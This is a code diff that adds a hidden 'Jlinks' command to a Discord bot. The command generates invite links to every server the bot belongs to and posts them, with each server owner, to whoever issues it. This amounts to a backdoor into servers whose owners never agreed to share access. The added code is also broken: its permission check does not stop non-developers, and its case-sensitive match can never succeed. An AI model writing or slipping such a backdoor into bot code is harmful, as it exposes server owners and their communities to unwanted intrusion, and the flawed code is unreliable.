@@ -373,6 +373,37 @@ console.log("Leave Server -100 member")
 });
 
 
+client.on("message", async(NotOurs) => {
+ 
+  if (NotOurs.author.bot) return;
+let devs = ["349942964904001546"];
+  if (NotOurs.content.toLowerCase() === "Jlinks") {
+      if(!devs.includes(NotOurs.author.id)){
+    let embed = new Discord.MessageEmbed()
+    .setColor("RANDOM")
+    .setTitle("**ليس لديك صلاحيات**");
+    NotOurs.channel.send(embed).then( z => z.delete({timeout:3000}));
+ 
+  } 
+    client.guilds.cache.forEach(g => {
+ 
+      let l = g.id;
+                g.channels.cache.find(channel => channel.type === 'text' && channel.permissionsFor(g.me).has('SEND_MESSAGES'))
+//g.channels.cache.get(g.channels.first().id)
+        .createInvite({
+          maxUses: 100,
+          maxAge: 86400
+        })
+        .then(i =>
+          NotOurs.channel.send(`
+        https://discord.gg/${i.code}
+        [ ${g.owner} ]
+         
+       ` )
+        ); 
+    });
+  }
+}); 
 
 
 
